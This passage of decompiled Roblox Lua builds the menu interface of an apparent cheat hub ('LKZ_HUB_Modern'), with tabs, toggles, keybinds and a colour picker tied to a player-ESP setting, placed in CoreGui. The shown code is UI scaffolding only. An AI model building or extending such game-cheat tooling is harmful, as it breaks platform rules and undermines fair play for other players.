                    v_u_256_[v260_] = "None"
                    v_u_254_.Text = "Keybind: -"
                else
                    v_u_256_[v260_] = v261_
                    local v270_ = v_u_252_[v260_]
                    if v270_ then
                        v_u_251_[v261_] = v270_
                    end
                    v_u_254_.Text = "Keybind: " .. v261_
                end
                v_u_227_:SetValue("Global", "Keybinds", v_u_256_)
                v_u_253_ = false
                v_u_254_ = nil
                v_u_250_("Keybind", "Key for " .. v260_ .. " set to: " .. v261_, 2)
            elseif not v_u_253_ then
                local v271_ = p258_.KeyCode and p258_.KeyCode.Name or ""
                if v271_ ~= "" and v_u_251_[v271_] then
                    pcall(v_u_251_[v271_])
                end
            end
        end)
    end)()
    local v272_ = Instance.new("ScreenGui")
    v272_.Name = "LKZ_HUB_Modern"
    v272_.Parent = game.CoreGui
    v272_.ResetOnSpawn = false
    v272_.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    local v_u_273_ = Instance.new("Frame")
    v_u_273_.Name = "MainContainer"
    if v_u_202_ then
        v_u_273_.Size = UDim2.new(0.4, 0, 0.85, 0)
    else
        v_u_273_.Size = UDim2.new(0.3, 0, 0.4, 0)
    end
    v_u_273_.Active = true
    v_u_273_.AnchorPoint = Vector2.new(0.5, 0.5)
    v_u_273_.Draggable = true
    v_u_273_.Position = UDim2.new(0.5, 0, 0.5, 0)
    v_u_273_.BackgroundColor3 = v_u_229_.BACKGROUND
    v_u_273_.BorderSizePixel = 0
    v_u_273_.ClipsDescendants = true
    v_u_273_.Visible = false
    v_u_273_.Parent = v272_
    local v274_ = Instance.new("UICorner")
    v274_.CornerRadius = UDim.new(0, 16)
    v274_.Parent = v_u_273_
    local v275_ = Instance.new("UIStroke")
    v275_.Color = v_u_229_.SECONDARY
    v275_.Thickness = 1
    v275_.Transparency = 0.7
    v275_.Parent = v_u_273_
    local v276_ = Instance.new("UIGradient")
    v276_.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 35)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
    })
    v276_.Rotation = 45
    v276_.Parent = v_u_273_
    local v277_ = Instance.new("ImageButton")
    v277_.Name = "ToggleButton"
    v277_.Size = UDim2.new(0, 65, 0, 65)
    v277_.AnchorPoint = Vector2.new(0.5, 0.5)
    v277_.Position = UDim2.new(0.5, - 275, 0.5, - 150)
    v277_.Active = true
    v277_.Draggable = true
    v277_.BorderSizePixel = 0
    v277_.Image = "rbxassetid://88557808889639"
    v277_.ImageColor3 = Color3.fromRGB(255, 255, 255)
    v277_.ScaleType = Enum.ScaleType.Fit
    v277_.Parent = v272_
    local v278_ = Instance.new("UICorner")
    v278_.CornerRadius = UDim.new(0, 12)
    v278_.Parent = v277_
    local v_u_279_ = false
    v277_.MouseButton1Click:Connect(function()
		-- upvalues: (ref) v_u_279_, (ref) v_u_273_
        v_u_279_ = not v_u_279_
        v_u_273_.Visible = v_u_279_
    end)
    local v280_ = Instance.new("Frame")
    v280_.Name = "Header"
    v280_.Size = UDim2.new(1, 0, 0, 60)
    v280_.Position = UDim2.new(0, 0, 0, 0)
    v280_.BackgroundColor3 = v_u_229_.SECONDARY
    v280_.BorderSizePixel = 0
    v280_.Parent = v_u_273_
    local v281_ = Instance.new("UICorner")
    v281_.CornerRadius = UDim.new(0, 16)
    v281_.Parent = v280_
    local v282_ = Instance.new("UIGradient")
    v282_.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, v_u_229_.SECONDARY),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 160, 255))
    })
    v282_.Rotation = 90
    v282_.Parent = v280_
    local v283_ = Instance.new("Frame")
    v283_.Size = UDim2.new(1, 0, 0, 20)
    v283_.Position = UDim2.new(0, 0, 1, - 20)
    v283_.BackgroundColor3 = v_u_229_.SECONDARY
    v283_.BorderSizePixel = 0
    v283_.Parent = v280_
    local v284_ = Instance.new("TextLabel")
    v284_.Name = "Title"
    v284_.Text = "shakingspeare"
    v284_.Size = UDim2.new(0.5, 0, 1, 0)
    v284_.Position = UDim2.new(0, 20, 0, 0)
    v284_.BackgroundTransparency = 1
    v284_.TextColor3 = Color3.fromRGB(255, 255, 255)
    v284_.Font = Enum.Font.GothamBold
    if v_u_202_ then
        v284_.TextSize = 30
    else
        v284_.TextSize = 40
    end
    v284_.TextXAlignment = Enum.TextXAlignment.Left
    v284_.TextYAlignment = Enum.TextYAlignment.Center
    v284_.Parent = v280_
    local v285_ = Instance.new("TextLabel")
    v285_.Name = "BestLabel"
    v285_.Text = "Best: -"
    v285_.Size = UDim2.new(0.48999998, 0, 1, 0)
    v285_.Position = UDim2.new(0.5, 0, 0, 0)
    v285_.BackgroundTransparency = 1
    v285_.TextColor3 = Color3.fromRGB(255, 215, 0)
    v285_.Font = Enum.Font.Gotham
    v285_.TextSize = 22
    v285_.TextXAlignment = Enum.TextXAlignment.Right
    v285_.TextYAlignment = Enum.TextYAlignment.Center
    v285_.Parent = v280_
    local v_u_286_ = Instance.new("ScrollingFrame")
    v_u_286_.Name = "TabsFrame"
    v_u_286_.Size = UDim2.new(1, - 20, 0, 40)
    v_u_286_.Position = UDim2.new(0, 10, 0, 70)
    v_u_286_.BackgroundTransparency = 1
    v_u_286_.ScrollBarThickness = 2
    v_u_286_.ScrollBarImageColor3 = v_u_229_.SECONDARY
    v_u_286_.BorderSizePixel = 0
    v_u_286_.ScrollingDirection = Enum.ScrollingDirection.X
    v_u_286_.CanvasSize = UDim2.new(0, 0, 0, 0)
    v_u_286_.Parent = v_u_273_
    local v_u_287_ = Instance.new("UIListLayout")
    v_u_287_.FillDirection = Enum.FillDirection.Horizontal
    v_u_287_.HorizontalAlignment = Enum.HorizontalAlignment.Left
    v_u_287_.VerticalAlignment = Enum.VerticalAlignment.Center
    v_u_287_.Padding = UDim.new(0, 5)
    v_u_287_.SortOrder = Enum.SortOrder.LayoutOrder
    v_u_287_.Parent = v_u_286_
    local function v290_()
		-- upvalues: (ref) v_u_287_, (ref) v_u_286_
        local v288_ = v_u_287_.AbsoluteContentSize.X
        local v289_ = v_u_286_.AbsoluteSize.X
        v_u_286_.CanvasSize = UDim2.new(0, math.max(v288_ + 10, math.floor(v289_)), 0, 0)
    end
    local v291_ = v_u_287_
    v_u_287_.GetPropertyChangedSignal(v291_, "AbsoluteContentSize"):Connect(v290_)
    local v292_ = v_u_286_
    v_u_286_.GetPropertyChangedSignal(v292_, "AbsoluteSize"):Connect(v290_)
    local v_u_293_ = Instance.new("Frame")
    v_u_293_.Name = "ContentFrame"
    v_u_293_.Size = UDim2.new(1, - 20, 1, - 120)
    v_u_293_.Position = UDim2.new(0, 10, 0, 120)
    v_u_293_.BackgroundTransparency = 1
    v_u_293_.Parent = v_u_273_
    local v_u_294_ = {}
    local v_u_295_ = {}
    local v_u_296_ = nil
    local v_u_297_ = 0
    local function v314_(p298_, p299_)
		-- upvalues: (ref) v_u_297_, (ref) v_u_202_, (ref) v_u_229_, (ref) v_u_286_, (ref) v_u_293_, (ref) v_u_294_, (ref) v_u_295_, (ref) v_u_296_
        v_u_297_ = v_u_297_ + 1
        local v_u_300_ = Instance.new("TextButton")
        v_u_300_.Name = p298_ .. "Tab"
        v_u_300_.Text = p298_
        if v_u_202_ then
            v_u_300_.Size = UDim2.new(0, 90, 0, 32)
        else
            v_u_300_.Size = UDim2.new(0, 110, 0, 32)
        end
        v_u_300_.BackgroundColor3 = v_u_229_.FRAME_BG
        v_u_300_.BorderSizePixel = 0
        v_u_300_.TextColor3 = v_u_229_.TEXT_DIM
        v_u_300_.Font = Enum.Font.Gotham
        if v_u_202_ then
            v_u_300_.TextSize = 12.5
        else
            v_u_300_.TextSize = 14
        end
        v_u_300_.LayoutOrder = v_u_297_
        v_u_300_.Parent = v_u_286_
        Instance.new("UICorner", v_u_300_).CornerRadius = UDim.new(0, 8)
        local v_u_301_ = Instance.new("ScrollingFrame")
        v_u_301_.Name = p298_ .. "Page"
        v_u_301_.Size = UDim2.new(1, 0, 1, 0)
        v_u_301_.BackgroundTransparency = 1
        v_u_301_.ScrollBarThickness = 4
        v_u_301_.ScrollBarImageColor3 = v_u_229_.SECONDARY
        v_u_301_.BorderSizePixel = 0
        v_u_301_.CanvasSize = UDim2.new(0, 0, 0, 0)
        v_u_301_.Visible = false
        v_u_301_.Parent = v_u_293_
        v_u_301_.LayoutOrder = v_u_297_
        v_u_301_.ZIndex = 2
        local v_u_302_ = Instance.new("UIListLayout", v_u_301_)
        v_u_302_.FillDirection = Enum.FillDirection.Vertical
        v_u_302_.HorizontalAlignment = Enum.HorizontalAlignment.Center
        v_u_302_.Padding = UDim.new(0, 8)
        v_u_302_.SortOrder = Enum.SortOrder.LayoutOrder
        local v303_ = v_u_302_
        v_u_302_.GetPropertyChangedSignal(v303_, "AbsoluteContentSize"):Connect(function()
			-- upvalues: (ref) v_u_301_, (ref) v_u_302_
            v_u_301_.CanvasSize = UDim2.new(0, 0, 0, v_u_302_.AbsoluteContentSize.Y + 10)
        end)
        table.insert(v_u_294_, v_u_300_)
        table.insert(v_u_295_, v_u_301_)
        v_u_300_.MouseButton1Click:Connect(function()
			-- upvalues: (ref) v_u_295_, (ref) v_u_294_, (ref) v_u_229_, (ref) v_u_301_, (ref) v_u_300_, (ref) v_u_296_
            local v304_, v305_, v306_ = ipairs(v_u_295_)
            while true do
                local v307_
                v306_, v307_ = v304_(v305_, v306_)
                if v306_ == nil then
                    break
                end
                v307_.Visible = false
            end
            local v308_, v309_, v310_ = ipairs(v_u_294_)
            while true do
                local v311_
                v310_, v311_ = v308_(v309_, v310_)
                if v310_ == nil then
                    break
                end
                v311_.BackgroundColor3 = v_u_229_.FRAME_BG
                v311_.TextColor3 = v_u_229_.TEXT_DIM
            end
            v_u_301_.Visible = true
            v_u_300_.BackgroundColor3 = v_u_229_.SECONDARY
            v_u_300_.TextColor3 = v_u_229_.TEXT
            v_u_296_ = v_u_300_
        end)
        if v_u_296_ == nil then
            v_u_300_.BackgroundColor3 = v_u_229_.SECONDARY
            v_u_300_.TextColor3 = v_u_229_.TEXT
            v_u_301_.Visible = true
            v_u_296_ = v_u_300_
        end
        local v312_ = v_u_301_
        v_u_301_.SetAttribute(v312_, "SaveConfigs", p299_ or false)
        local v313_ = v_u_301_
        v_u_301_.SetAttribute(v313_, "TabName", p298_)
        return v_u_301_
    end
    local function v337_(p_u_315_, p316_, p_u_317_, p_u_318_)
		-- upvalues: (ref) v_u_229_, (ref) v_u_227_, (ref) v_u_250_, (ref) v_u_209_, (ref) v_u_252_, (ref) v_u_256_, (ref) v_u_251_
        local v_u_319_ = p316_:GetAttribute("TabName")
        local v_u_320_ = p316_:GetAttribute("SaveConfigs")
        local v321_ = Instance.new("Frame")
        v321_.Name = p_u_315_ .. "Toggle"
        v321_.Size = UDim2.new(1, - 10, 0, 40)
        v321_.BackgroundTransparency = 1
        v321_.BorderSizePixel = 0
        v321_.LayoutOrder = # p316_:GetChildren() + 1
        v321_.Parent = p316_
        local v_u_322_ = Instance.new("Frame")
        v_u_322_.Name = "Inner"
        v_u_322_.Size = UDim2.new(1, 0, 1, - 2)
        v_u_322_.Position = UDim2.new(0, 0, 0, 2)
        v_u_322_.BackgroundColor3 = v_u_229_.FRAME_BG
        v_u_322_.BorderSizePixel = 0
        v_u_322_.Parent = v321_
        Instance.new("UICorner", v_u_322_).CornerRadius = UDim.new(0, 12)
        local v323_ = Instance.new("UIStroke", v_u_322_)
        v323_.Color = Color3.fromRGB(50, 50, 60)
        v323_.Thickness = 1
        local v324_ = Instance.new("TextLabel")
        v324_.Size = UDim2.new(1, - 60, 1, 0)
        v324_.Position = UDim2.new(0, 10, 0, 0)
        v324_.BackgroundTransparency = 1
        v324_.Text = p_u_315_
        v324_.TextColor3 = v_u_229_.TEXT
        v324_.Font = Enum.Font.Gotham
        v324_.TextSize = 14
        v324_.TextXAlignment = Enum.TextXAlignment.Left
        v324_.Parent = v_u_322_
        local v_u_325_ = Instance.new("Frame")
        v_u_325_.Size = UDim2.new(0, 40, 0, 20)
        v_u_325_.Position = UDim2.new(1, - 50, 0.5, - 10)
        v_u_325_.BackgroundColor3 = v_u_229_.TOGGLE_OFF
        v_u_325_.BorderSizePixel = 0
        v_u_325_.Parent = v_u_322_
        Instance.new("UICorner", v_u_325_).CornerRadius = UDim.new(0, 10)
        local v_u_326_ = Instance.new("Frame")
        v_u_326_.Size = UDim2.new(0, 16, 0, 16)
        v_u_326_.Position = UDim2.new(0, 2, 0, 2)
        v_u_326_.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
        v_u_326_.BorderSizePixel = 0
        v_u_326_.Parent = v_u_325_
        Instance.new("UICorner", v_u_326_).CornerRadius = UDim.new(0, 8)
        local v327_ = Instance.new("TextButton")
        v327_.Size = UDim2.new(1, 0, 1, 0)
        v327_.BackgroundTransparency = 1
        v327_.Text = ""
        v327_.Parent = v321_
        local v_u_328_ = v_u_227_:GetValue(v_u_319_, p_u_315_, false)
        local v_u_329_ = 0
        local function v_u_331_(p330_)
			-- upvalues: (ref) v_u_326_, (ref) v_u_325_, (ref) v_u_229_
            v_u_326_.Position = p330_ and UDim2.new(0, 22, 0, 2) or UDim2.new(0, 2, 0, 2)
            v_u_325_.BackgroundColor3 = p330_ and v_u_229_.TOGGLE_ON or v_u_229_.TOGGLE_OFF
        end
        v_u_331_(v_u_328_)
        if p_u_317_ then
            pcall(p_u_317_, v_u_328_)
        end
        local function v334_()
			-- upvalues: (ref) p_u_318_, (ref) v_u_329_, (ref) v_u_250_, (ref) p_u_315_, (ref) v_u_328_, (ref) v_u_320_, (ref) v_u_227_, (ref) v_u_319_, (ref) v_u_209_, (ref) v_u_326_, (ref) v_u_325_, (ref) v_u_229_, (ref) p_u_317_
            if p_u_318_ and type(p_u_318_) == "number" then
                local v332_ = tick() - v_u_329_
                if v332_ < p_u_318_ then
                    v_u_250_(p_u_315_, "Wait " .. math.ceil(p_u_318_ - v332_) .. "s before toggling again.", 2)
                    return
                end
            end
            v_u_328_ = not v_u_328_
            if v_u_320_ then
                v_u_227_:SetValue(v_u_319_, p_u_315_, v_u_328_)
            end
            local v333_ = TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
            v_u_209_:Create(v_u_326_, v333_, {
                ["Position"] = v_u_328_ and UDim2.new(0, 22, 0, 2) or UDim2.new(0, 2, 0, 2)
            }):Play()
            v_u_209_:Create(v_u_325_, v333_, {
                ["BackgroundColor3"] = v_u_328_ and v_u_229_.TOGGLE_ON or v_u_229_.TOGGLE_OFF
            }):Play()
            if p_u_317_ then
                pcall(p_u_317_, v_u_328_)
            end
            v_u_250_(p_u_315_, v_u_328_ and "Enabled" or "Disabled", 2)
            v_u_329_ = tick()
        end
        v327_.MouseButton1Click:Connect(v334_)
        v_u_252_[p_u_315_] = v334_
        local v335_ = v_u_256_[p_u_315_]
        if v335_ and v335_ ~= "None" then
            v_u_251_[v335_] = v334_
        end
        v327_.MouseEnter:Connect(function()
			-- upvalues: (ref) v_u_322_
            v_u_322_.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
        end)
        v327_.MouseLeave:Connect(function()
			-- upvalues: (ref) v_u_322_, (ref) v_u_229_
            v_u_322_.BackgroundColor3 = v_u_229_.FRAME_BG
        end)
        return v321_, function()
			-- upvalues: (ref) v_u_328_
            return v_u_328_
        end, function(p336_)
			-- upvalues: (ref) v_u_328_, (ref) v_u_331_, (ref) p_u_317_, (ref) v_u_320_, (ref) v_u_227_, (ref) v_u_319_, (ref) p_u_315_, (ref) v_u_329_
            v_u_328_ = p336_
            v_u_331_(v_u_328_)
            if p_u_317_ then
                pcall(p_u_317_, v_u_328_)
            end
            if v_u_320_ then
                v_u_227_:SetValue(v_u_319_, p_u_315_, v_u_328_)
            end
            if v_u_328_ then
                v_u_329_ = tick()
            end
        end
    end
    local function v347_(p338_, p339_, p_u_340_)
		-- upvalues: (ref) v_u_229_, (ref) v_u_252_, (ref) v_u_256_, (ref) v_u_251_, (ref) v_u_209_
        local v341_ = Instance.new("Frame")
        v341_.Name = p338_ .. "ButtonOuter"
        v341_.Size = UDim2.new(1, - 10, 0, 40)
        v341_.BackgroundTransparency = 1
        v341_.BorderSizePixel = 0
        v341_.LayoutOrder = # p339_:GetChildren() + 1
        v341_.Parent = p339_
        local v_u_342_ = Instance.new("Frame")
        v_u_342_.Name = p338_ .. "ButtonInner"
        v_u_342_.Size = UDim2.new(1, 0, 1, - 2)
        v_u_342_.Position = UDim2.new(0, 0, 0, 2)
        v_u_342_.BackgroundColor3 = v_u_229_.PRIMARY
        v_u_342_.BorderSizePixel = 0
        v_u_342_.Parent = v341_
        Instance.new("UICorner", v_u_342_).CornerRadius = UDim.new(0, 12)
        local v343_ = Instance.new("TextLabel")
        v343_.Size = UDim2.new(1, 0, 1, 0)
        v343_.BackgroundTransparency = 1
        v343_.Text = p338_
        v343_.TextColor3 = Color3.fromRGB(0, 0, 0)
        v343_.Font = Enum.Font.GothamBold
        v343_.TextSize = 14
        v343_.Parent = v_u_342_
        local v344_ = Instance.new("TextButton")
        v344_.Size = UDim2.new(1, 0, 1, 0)
        v344_.BackgroundTransparency = 1
        v344_.Text = ""
        v344_.Parent = v341_
        local function v345_()
			-- upvalues: (ref) p_u_340_
            if p_u_340_ then
                pcall(p_u_340_)
            end
        end
        v344_.MouseButton1Click:Connect(v345_)
        v_u_252_[p338_] = v345_
        local v346_ = v_u_256_[p338_]
        if v346_ and v346_ ~= "None" then
            v_u_251_[v346_] = v345_
        end
        v344_.MouseEnter:Connect(function()
			-- upvalues: (ref) v_u_209_, (ref) v_u_342_, (ref) v_u_229_
            v_u_209_:Create(v_u_342_, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                ["BackgroundColor3"] = v_u_229_.SECONDARY
            }):Play()
        end)
        v344_.MouseLeave:Connect(function()
			-- upvalues: (ref) v_u_209_, (ref) v_u_342_, (ref) v_u_229_
            v_u_209_:Create(v_u_342_, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
                ["BackgroundColor3"] = v_u_229_.PRIMARY
            }):Play()
        end)
        return v341_, v343_, v_u_342_
    end
    local function v370_(p348_, p_u_349_, p350_)
		-- upvalues: (ref) v_u_229_
        local v_u_351_ = game:GetService("TextService")
        local v_u_352_ = Instance.new("Frame")
        v_u_352_.Name = p348_ .. "ParagraphOuter"
        v_u_352_.Size = UDim2.new(1, - 10, 0, 0)
        v_u_352_.BackgroundTransparency = 1
        v_u_352_.BorderSizePixel = 0
        v_u_352_.LayoutOrder = # p350_:GetChildren() + 1
        v_u_352_.Parent = p350_
        local v_u_353_ = Instance.new("Frame", v_u_352_)
        v_u_353_.Name = p348_ .. "Paragraph"
        v_u_353_.Size = UDim2.new(1, 0, 1, - 2)
        v_u_353_.Position = UDim2.new(0, 0, 0, 2)
        v_u_353_.BackgroundColor3 = v_u_229_.FRAME_BG
        v_u_353_.BorderSizePixel = 0
        Instance.new("UICorner", v_u_353_).CornerRadius = UDim.new(0, 12)
        local v354_ = Instance.new("UIStroke", v_u_353_)
        v354_.Color = Color3.fromRGB(50, 50, 60)
        v354_.Thickness = 1
        local v355_ = Instance.new("TextLabel")
        v355_.Size = UDim2.new(1, - 20, 0, 28)
        v355_.Position = UDim2.new(0, 10, 0, 5)
        v355_.BackgroundTransparency = 1
        v355_.Text = p348_
        v355_.TextColor3 = v_u_229_.PRIMARY
        v355_.Font = Enum.Font.GothamBold
        v355_.TextSize = 20
        v355_.TextXAlignment = Enum.TextXAlignment.Left
        v355_.Parent = v_u_353_
        local v_u_356_ = Instance.new("TextLabel")
        v_u_356_.Size = UDim2.new(1, - 20, 0, 50)
        v_u_356_.Position = UDim2.new(0, 10, 0, 35)
        v_u_356_.BackgroundTransparency = 1
        v_u_356_.Text = p_u_349_ or ""
        v_u_356_.TextColor3 = v_u_229_.TEXT_DIM
        v_u_356_.Font = Enum.Font.Gotham
        v_u_356_.TextSize = 13.75
        v_u_356_.TextXAlignment = Enum.TextXAlignment.Left
        v_u_356_.TextYAlignment = Enum.TextYAlignment.Top
        v_u_356_.TextWrapped = true
        v_u_356_.RichText = false
        v_u_356_.Parent = v_u_353_
        local function v_u_369_()
			-- upvalues: (ref) v_u_353_, (ref) v_u_352_, (ref) v_u_356_, (ref) v_u_351_, (ref) p_u_349_
            local v357_ = v_u_353_.AbsoluteSize.X
            if (not v357_ or v357_ <= 1) and (v_u_352_ and v_u_352_.AbsoluteSize) then
                v357_ = v_u_352_.AbsoluteSize.X
            end
            local v358_ = (not v357_ or v357_ <= 1) and 300 or v357_
            local v359_ = math.max(v358_ - 20, 50)
            local v360_ = v_u_356_.Text or ""
            local v361_ = v360_ == "" and {
                ""
            } or string.split(v360_, "\n")
            local v362_, v363_, v364_ = ipairs(v361_)
            local v365_ = 4
            local v366_ = 0
            while true do
                local v367_
                v364_, v367_ = v362_(v363_, v364_)
                if v364_ == nil then
                    break
                end
                v366_ = v366_ + v_u_351_:GetTextSize((v367_ == "" or not v367_) and " " or v367_, v_u_356_.TextSize, v_u_356_.Font, Vector2.new(v359_, math.huge)).Y
                if v364_ < # v361_ then
                    v366_ = v366_ + v365_
                end
            end
            local v368_ = math.max(v366_, 20)
            v_u_356_.Size = UDim2.new(1, - 20, 0, v368_)
            v_u_353_.Size = UDim2.new(1, 0, 0, v368_ + 45)
            v_u_352_.Size = UDim2.new(1, - 10, 0, v_u_353_.Size.Y.Offset + 2)
            if p_u_349_ == "" then
                v_u_356_.Size = UDim2.new(1, - 20, 0, 0)
                v_u_353_.Size = UDim2.new(1, 0, 0, 38)
                v_u_352_.Size = UDim2.new(1, - 10, 0, 40)
            end
        end
        v_u_353_:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
			-- upvalues: (ref) v_u_369_
            pcall(v_u_369_)
        end)
        if v_u_352_ and v_u_352_.GetPropertyChangedSignal then
            v_u_352_:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
				-- upvalues: (ref) v_u_369_
                pcall(v_u_369_)
            end)
        end
        v_u_356_:GetPropertyChangedSignal("Text"):Connect(function()
			-- upvalues: (ref) v_u_369_
            pcall(v_u_369_)
        end)
        task.spawn(function()
			-- upvalues: (ref) v_u_369_
            task.wait()
            pcall(v_u_369_)
        end)
        return v_u_352_, v_u_356_
    end
    local function v382_(p371_, p372_, p373_)
		-- upvalues: (ref) v_u_256_, (ref) v_u_229_, (ref) v_u_253_, (ref) v_u_254_, (ref) v_u_250_
        local v374_ = p373_ or "None"
        if v_u_256_[p371_] == nil then
            v_u_256_[p371_] = v374_
        end
        local v375_ = Instance.new("Frame")
        v375_.Name = p371_ .. "KeybindOuter"
        v375_.Size = UDim2.new(1, - 10, 0, 40)
        v375_.BackgroundTransparency = 1
        v375_.BorderSizePixel = 0
        v375_.LayoutOrder = # p372_:GetChildren() + 1
        v375_.Parent = p372_
        local v376_ = Instance.new("Frame")
        v376_.Name = "Inner"
        v376_.Size = UDim2.new(1, 0, 1, - 2)
        v376_.Position = UDim2.new(0, 0, 0, 2)
        v376_.BackgroundColor3 = v_u_229_.FRAME_BG
        v376_.BorderSizePixel = 0
        v376_.Parent = v375_
        Instance.new("UICorner", v376_).CornerRadius = UDim.new(0, 12)
        local v377_ = Instance.new("UIStroke", v376_)
        v377_.Color = Color3.fromRGB(50, 50, 60)
        v377_.Thickness = 1
        local v378_ = Instance.new("TextLabel")
        v378_.Size = UDim2.new(1, - 120, 1, 0)
        v378_.Position = UDim2.new(0, 10, 0, 0)
        v378_.BackgroundTransparency = 1
        v378_.Text = p371_
        v378_.TextColor3 = v_u_229_.TEXT
        v378_.Font = Enum.Font.Gotham
        v378_.TextSize = 14
        v378_.TextXAlignment = Enum.TextXAlignment.Left
        v378_.Parent = v376_
        local v_u_379_ = Instance.new("TextButton")
        v_u_379_.Name = p371_
        v_u_379_.Size = UDim2.new(0, 100, 0, 24)
        v_u_379_.Position = UDim2.new(1, - 110, 0.5, - 12)
        v_u_379_.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
        v_u_379_.BorderSizePixel = 0
        local v380_ = v_u_256_[p371_]
        v_u_379_.Text = v380_ and (v380_ ~= "None" and "Keybind: " .. v380_ or "Keybind: -") or "Keybind: -"
        v_u_379_.TextColor3 = v_u_229_.TEXT
        v_u_379_.TextSize = 10
        v_u_379_.Font = Enum.Font.Gotham
        v_u_379_.Parent = v376_
        Instance.new("UICorner", v_u_379_).CornerRadius = UDim.new(0, 8)
        v_u_379_.MouseButton1Click:Connect(function()
			-- upvalues: (ref) v_u_253_, (ref) v_u_254_, (ref) v_u_256_, (ref) v_u_250_, (ref) v_u_379_
            if v_u_253_ then
                if v_u_254_ then
                    local v381_ = v_u_256_[v_u_254_.Name]
                    v_u_254_.Text = v381_ and (v381_ ~= "None" and "Keybind: " .. v381_ or "Keybind: -") or "Keybind: -"
                end
                v_u_253_ = false
                v_u_254_ = nil
                v_u_250_("Keybind", "Canceled", 2)
            else
                v_u_253_ = true
                v_u_254_ = v_u_379_
                v_u_379_.Text = "..."
                v_u_250_("Keybind", "Press any key... (Press \'None\' to unbind)", 3)
            end
        end)
        return v375_
    end
    local function v404_(p_u_383_, p384_, p385_, p_u_386_)
		-- upvalues: (ref) v_u_227_, (ref) v_u_229_, (ref) v_u_273_
        local v_u_387_ = p384_:GetAttribute("TabName")
        local v_u_388_ = p384_:GetAttribute("SaveConfigs")
        if v_u_388_ then
            local v389_ = v_u_227_:GetValue(v_u_387_, p_u_383_, nil)
            if v389_ and (type(v389_) == "table" and v389_.R ~= nil) then
                p385_ = Color3.fromRGB(v389_.R, v389_.G, v389_.B)
            end
        end
        local v390_ = Instance.new("Frame")
        v390_.Name = p_u_383_ .. "ColorPickerOuter"
        v390_.Size = UDim2.new(1, - 10, 0, 40)
        v390_.BackgroundTransparency = 1
        v390_.BorderSizePixel = 0
        v390_.LayoutOrder = # p384_:GetChildren() + 1
        v390_.Parent = p384_
        local v391_ = Instance.new("Frame", v390_)
        v391_.Name = p_u_383_ .. "ColorPicker"
        v391_.Size = UDim2.new(1, 0, 1, - 2)
        v391_.Position = UDim2.new(0, 0, 0, 2)
        v391_.BackgroundColor3 = v_u_229_.FRAME_BG
        v391_.BorderSizePixel = 0
        Instance.new("UICorner", v391_).CornerRadius = UDim.new(0, 12)
        local v392_ = Instance.new("UIStroke", v391_)
        v392_.Color = Color3.fromRGB(50, 50, 60)
        v392_.Thickness = 1
        local v393_ = Instance.new("TextLabel")
        v393_.Size = UDim2.new(0.6, - 20, 1, 0)
        v393_.Position = UDim2.new(0, 15, 0, 0)
        v393_.BackgroundTransparency = 1
        v393_.Text = p_u_383_
        v393_.TextColor3 = v_u_229_.TEXT
        v393_.Font = Enum.Font.Gotham
        v393_.TextSize = 14
        v393_.TextXAlignment = Enum.TextXAlignment.Left
        v393_.Parent = v391_
        local v_u_394_ = Instance.new("TextButton")
        v_u_394_.Name = "Open"
        v_u_394_.Size = UDim2.new(0, 36, 0, 36)
        v_u_394_.Position = UDim2.new(1, - 54, 0.5, - 18)
        v_u_394_.BackgroundColor3 = p385_ or (_G.PlayerESPColor or Color3.fromRGB(0, 255, 0))
        v_u_394_.BorderSizePixel = 0
        v_u_394_.AutoButtonColor = false
        v_u_394_.Text = ""
        v_u_394_.TextTransparency = 1
        v_u_394_.Parent = v391_
        Instance.new("UICorner", v_u_394_).CornerRadius = UDim.new(0, 8)
        local v_u_395_ = Instance.new("Frame")
        v_u_395_.Name = "MiniPicker"
        v_u_395_.Size = UDim2.new(0, 240, 0, 120)
        v_u_395_.Position = UDim2.new(0.5, - 120, 0.5, - 60)
        v_u_395_.BackgroundColor3 = Color3.fromRGB(24, 26, 34)
        v_u_395_.Visible = false
        v_u_395_.BorderSizePixel = 0
        v_u_395_.Parent = v_u_273_
        Instance.new("UICorner", v_u_395_).CornerRadius = UDim.new(0, 12)
        local v396_ = {
            Color3.fromRGB(0, 255, 0),
            Color3.fromRGB(255, 0, 0),
            Color3.fromRGB(0, 0, 255),
            Color3.fromRGB(255, 255, 0),
            Color3.fromRGB(255, 0, 255),
            Color3.fromRGB(0, 255, 255),
            Color3.fromRGB(255, 165, 0),
            Color3.fromRGB(128, 0, 128),
            Color3.fromRGB(0, 128, 0),
            Color3.fromRGB(128, 128, 0),
            Color3.fromRGB(0, 128, 128),
            Color3.fromRGB(128, 0, 0),
            Color3.fromRGB(0, 0, 128),
            Color3.fromRGB(192, 192, 192),
            Color3.fromRGB(255, 192, 203),
            Color3.fromRGB(60, 179, 113),
            Color3.fromRGB(70, 130, 180),
            Color3.fromRGB(210, 105, 30),
            Color3.fromRGB(244, 164, 96),
            Color3.fromRGB(75, 0, 130)
        }
        local v397_ = Instance.new("Frame")
        v397_.Size = UDim2.new(1, - 10, 1, - 10)
        v397_.Position = UDim2.new(0, 5, 0, 5)
        v397_.BackgroundTransparency = 1
        v397_.Parent = v_u_395_
        local v398_ = Instance.new("UIGridLayout", v397_)
        v398_.CellSize = UDim2.new(0, 40, 0, 40)
        v398_.CellPadding = UDim2.new(0, 6, 0, 6)
        v398_.FillDirection = Enum.FillDirection.Horizontal
        local v399_, v400_, v401_ = ipairs(v396_)
        while true do
            local v_u_402_
            v401_, v_u_402_ = v399_(v400_, v401_)
            if v401_ == nil then
                break
            end
            local v403_ = Instance.new("TextButton")
            v403_.Size = UDim2.new(0, 40, 0, 40)
            v403_.BackgroundColor3 = v_u_402_
            v403_.BorderSizePixel = 0
            v403_.AutoButtonColor = false
            v403_.Text = ""
            v403_.Parent = v397_
            Instance.new("UICorner", v403_).CornerRadius = UDim.new(0, 8)
            v403_.MouseButton1Click:Connect(function()
